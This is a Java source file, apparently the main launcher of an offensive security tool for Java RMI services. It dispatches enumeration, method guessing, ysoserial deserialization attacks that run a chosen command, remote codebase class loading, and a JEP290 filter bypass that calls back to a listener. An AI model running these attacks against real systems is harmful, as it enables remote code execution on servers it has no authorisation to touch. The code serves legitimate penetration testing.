package de.qtc.rmg;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Properties;

import org.apache.commons.cli.CommandLine;

import de.qtc.rmg.exceptions.UnexpectedCharacterException;
import de.qtc.rmg.internal.ArgumentParser;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Formatter;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.WordlistHandler;
import de.qtc.rmg.operations.DGCClient;
import de.qtc.rmg.operations.MethodAttacker;
import de.qtc.rmg.operations.MethodGuesser;
import de.qtc.rmg.operations.RegistryClient;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import de.qtc.rmg.utils.SampleWriter;
import javassist.CannotCompileException;
import javassist.NotFoundException;

public class Starter {

    private static String defaultConfiguration = "/config.properties";

    @SuppressWarnings({ "rawtypes", "deprecation", "unchecked" })
    public static void main(String[] argv) {

        ArgumentParser parser = new ArgumentParser();
        CommandLine commandLine = parser.parse(argv);

        parser.checkArgumentCount(2);
        String action = "enum";
        String host = parser.getPositionalString(0);
        int port = parser.getPositionalInt(1);

        if( parser.getArgumentCount() >= 3 ) {
            action = parser.getPositionalString(2);

            if( action.equals("attack") || action.contains("codebase")) {
                parser.checkArgumentCount(5);

                if(action.equals("codebase") && !commandLine.hasOption("signature")) {
                    Logger.eprintlnMixedYellow("The", "--signature", "option is required for " + action + " mode.");
                    RMGUtils.exit();
                }
            }

            if( action.contains("codebase" )) {
                String serverAddress = parser.getPositionalString(3);

                if( !serverAddress.startsWith("ftp://") && !serverAddress.startsWith("file://") && !serverAddress.startsWith("http") )
                    serverAddress = "http://" + serverAddress + "/";

                System.setProperty("java.rmi.server.codebase", serverAddress);
            }

            if( action.equals("bypass") )
                parser.checkArgumentCount(4);
        }

        Properties config = new Properties();
        RMGUtils.loadConfig(defaultConfiguration, config, false);

        String additionalConfig = commandLine.getOptionValue("config", null);
        if( additionalConfig != null )
            RMGUtils.loadConfig(additionalConfig, config, true);

        int legacyMode = parser.getLegacyMode();
        int argumentPos = Integer.valueOf(commandLine.getOptionValue("argument-position", "-1"));
        int threadCount = Integer.valueOf(commandLine.getOptionValue("threads", config.getProperty("threads")));
        String sampleFolder = commandLine.getOptionValue("sample-folder", config.getProperty("sample-folder"));
        String wordlistFile = commandLine.getOptionValue("wordlist-file", config.getProperty("wordlist-file"));
        String templateFolder = commandLine.getOptionValue("template-folder", config.getProperty("template-folder"));
        String wordlistFolder = commandLine.getOptionValue("wordlist-folder", config.getProperty("wordlist-folder"));
        String ysoserialPath = commandLine.getOptionValue("yso", config.getProperty("ysoserial-path"));
        String functionSignature = commandLine.getOptionValue("signature", null);
        String boundName = commandLine.getOptionValue("bound-name", null);

        Logger.verbose = !commandLine.hasOption("json");
        boolean sslValue = commandLine.hasOption("ssl");
        boolean followRedirect = commandLine.hasOption("follow");
        boolean updateWordlists = commandLine.hasOption("update");
        boolean createSamples = commandLine.hasOption("create-samples");
        boolean zeroArg = commandLine.hasOption("zero-arg");

        if( commandLine.hasOption("no-color") ) {
            Logger.disableColor();
        }

        Formatter format = new Formatter(commandLine.hasOption("json"));
        RMIWhisperer rmi = new RMIWhisperer(host, port, sslValue, followRedirect);

        RMGUtils.init();
        RMGUtils.enableCodebase();
        RMGUtils.disableWarning();
        RMGUtils.showStackTrace(commandLine.hasOption("stack-trace"));

        String[] boundNames = null;
        HashMap<String,String> allClasses = null;
        ArrayList<HashMap<String,String>> boundClasses = null;

        if( !action.contains("dgc") && !action.equals("bypass") ) {
            rmi.locateRegistry();

            boundNames = rmi.getBoundNames(boundName);

            boundClasses = rmi.getClassNames(boundNames);
            allClasses = (HashMap<String, String>) boundClasses.get(0).clone();
            allClasses.putAll(boundClasses.get(1));
        }

        MethodCandidate candidate = null;
        if( functionSignature != null ) {

            try {
                candidate = new MethodCandidate(functionSignature);

            } catch (CannotCompileException | NotFoundException e) {
                Logger.eprintln("Supplied method signature seems to be invalid.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }

        switch( action ) {

            case "guess":
                if( !RMGUtils.containsUnknown(boundClasses.get(1)) )
                    break;

                HashSet<MethodCandidate> candidates = new HashSet<MethodCandidate>();
                if( candidate != null ) {
                    candidates.add(candidate);

                } else {

                    try {
                        WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlists);
                        candidates = wlHandler.getWordlistMethods();
                    } catch( IOException e ) {
                        Logger.eprintlnMixedYellow("Caught", "IOException", "while reading wordlist file(s).");
                        RMGUtils.stackTrace(e);
                        RMGUtils.exit();
                    }
                }

                MethodGuesser guesser = new MethodGuesser(rmi, boundClasses.get(1), candidates);
                HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, createSamples, zeroArg, legacyMode);

                format.listGuessedMethods(results);
                if( !createSamples )
                    break;

                Logger.println("");
                Logger.println("Starting creation of sample files:");
                Logger.println("");
                Logger.increaseIndent();

                try {
                    String className;
                    SampleWriter writer;
                    writer = new SampleWriter(templateFolder, sampleFolder, sslValue, followRedirect, legacyMode);

                    for(String name : results.keySet()) {

                        Logger.printlnMixedYellow("Creating samples for bound name", name);
                        Logger.increaseIndent();

                        className = boundClasses.get(1).get(name);
                        writer.createInterface(name, className, (List<MethodCandidate>)results.get(name));
                        writer.createSamples(name, className, (List<MethodCandidate>)results.get(name), rmi);

                        Logger.decreaseIndent();
                    }

                } catch (IOException | CannotCompileException | NotFoundException e) {
                    Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during sample creation.");
                    RMGUtils.stackTrace(e);
                    RMGUtils.exit();

                } catch (UnexpectedCharacterException e) {
                    Logger.eprintlnMixedYellow("Caught", "UnexpectedCharacterException", "during sample creation.");
                    Logger.eprintln("This is caused by special characters within bound- or classes names.");
                    Logger.eprintlnMixedYellow("You can enforce sample cration with the", "--trusted", "switch.");
                    RMGUtils.exit();
                }

                Logger.decreaseIndent();
                break;

            case "attack":
            case "dgc":

                String gadget = parser.getPositionalString(3);
                String command = parser.getPositionalString(4);

                if(ysoserialPath == null) {
                    Logger.eprintlnMixedYellow("Path for", "ysoserial.jar", "is null.");
                    Logger.increaseIndent();
                    Logger.eprintlnMixedYellow("Check your configuration file or specify it on the command line using the", "--yso", "parameter");
                    RMGUtils.exit();
                }

                Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);

                if( action.equals("attack") ) {
                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
                    attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
                } else {
                    DGCClient dgc = new DGCClient(rmi);
                    dgc.attackCleanCall(payload);
                }

                break;

            case "codebase":
            case "dgc-codebase":

                String className = parser.getPositionalString(4);

                payload = null;

                try {
                    payload = RMGUtils.makeSerializableClass(className);
                    payload = ((Class)payload).newInstance();

                } catch (CannotCompileException | NotFoundException | InstantiationException | IllegalAccessException e) {
                    Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during payload creation.");
                    RMGUtils.stackTrace(e);
                    RMGUtils.exit();
                }

                if( action.equals("codebase") ) {
                    MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
                    attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
                } else {
                    DGCClient dgc = new DGCClient(rmi);
                    dgc.codebaseCleanCall(payload);
                }

                break;

            case "bypass":

                String listener = parser.getPositionalString(3);
                String[] split = listener.split(":");

                if( split.length != 2 || !split[1].matches("\\d+") ) {
                    Logger.eprintlnMixedYellow("Listener must be specified as", "host:port");
                    RMGUtils.exit();
                }

                String listenerHost = split[0];
                int listenerPort = Integer.valueOf(split[1]);

                Logger.printlnBlue("Attempting RMI deserialization filter bypass.");
                Logger.printlnMixedBlue("Successful bypass will trigger an outbout connection to", listenerHost + ":" + listenerPort);
                Logger.println("");
                Logger.increaseIndent();

                RegistryClient registryClient = new RegistryClient(rmi);
                registryClient.invokeAnTrinhBypass(listenerHost, listenerPort);

                break;

            default:
                Logger.printlnMixedYellow("Unknown action:", action, ".");
                Logger.printlnMixedBlue("Performing default action:", "enum");

            case "enum":
                Logger.println("");
                format.listBoundNames(boundNames, boundClasses);

                Logger.println("");
                format.listCodeases();

                Logger.println("");
                DGCClient dgc = new DGCClient(rmi);
                dgc.enumSecurityManager();

                Logger.println("");
                dgc.enumJEP290();
        }
    }
}
